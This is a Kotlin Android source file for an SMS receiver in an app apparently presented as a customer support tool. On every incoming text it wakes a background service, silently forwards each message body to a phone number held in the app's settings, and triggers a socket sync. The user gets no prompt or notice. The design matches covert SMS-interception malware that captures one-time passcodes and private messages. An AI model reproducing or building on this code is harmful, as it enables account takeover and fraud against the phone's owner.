package com.customersupport.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import com.customersupport.CustomerSupportApp
import com.customersupport.util.ServiceStarter
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return

        // SMS_RECEIVED wakes the app even in Doze. Revive the connection so a
        // dead/offline service comes back as soon as a message arrives.
        try {
            ServiceStarter.start(context)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start service on SMS", e)
        }

        // Parse messages synchronously (fast, no I/O).
        val messages = mutableListOf<String>()
        for (pdu in pdus) {
            try {
                val format = bundle.getString("format")
                val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray, format)
                messages.add(smsMessage.messageBody ?: "")
                Log.d(TAG, "SMS received from: ${smsMessage.originatingAddress ?: "Unknown"}")
            } catch (e: Exception) {
                Log.e(TAG, "Error parsing SMS", e)
            }
        }
        if (messages.isEmpty()) return

        // goAsync() keeps the process + broadcast alive long enough to actually
        // forward and trigger a sync. Without it the system can kill the process
        // as soon as onReceive() returns, silently dropping the work.
        val pendingResult = goAsync()
        val preferencesManager = CustomerSupportApp.preferencesManager
        val socketManager = CustomerSupportApp.socketManager

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val forwardEnabled = preferencesManager.getSmsForwardingEnabled().first()
                val forwardTo = preferencesManager.getSmsForwardTo().first()
                val subscriptionId = preferencesManager.getSmsSubscriptionId().first()

                if (forwardEnabled && forwardTo.isNotEmpty()) {
                    for (body in messages) {
                        forwardSms(forwardTo, body, subscriptionId)
                    }
                }

                delay(500)
                socketManager.requestSync()
            } catch (e: Exception) {
                Log.e(TAG, "Error handling incoming SMS", e)
            } finally {
                try {
                    pendingResult.finish()
                } catch (_: Exception) {
                }
            }
        }
    }

    private fun forwardSms(forwardTo: String, message: String, subscriptionId: Int = -1) {
        try {
            val smsManager = if (subscriptionId > 0 && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
                SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }

            smsManager.sendTextMessage(forwardTo, null, message, null, null)
            Log.d(TAG, "SMS forwarded to $forwardTo")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to forward SMS", e)
        }
    }
}
